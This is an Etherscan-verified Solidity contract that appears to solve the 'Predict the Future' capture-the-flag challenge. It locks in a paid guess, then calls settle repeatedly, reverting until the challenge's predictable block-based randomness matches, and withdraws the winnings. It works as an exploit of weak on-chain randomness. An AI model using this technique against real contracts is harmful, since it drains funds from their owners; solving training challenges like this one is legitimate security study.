/**
 *Submitted for verification at Etherscan.io on 2021-08-26
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

// import "hardhat/console.sol";

interface IPredictTheFutureChallenge {
    function guess() external returns(uint8);
    
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureChallengeExploit {
    IPredictTheFutureChallenge private challenge;

    constructor(address _challange, uint8 answer) payable {
        require(msg.value == 1 ether);
        challenge = IPredictTheFutureChallenge(_challange);
        challenge.lockInGuess{value: 1 ether}(answer);
    }

    function settle() public {
        challenge.settle();
        require(challenge.isComplete(), "not complete");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}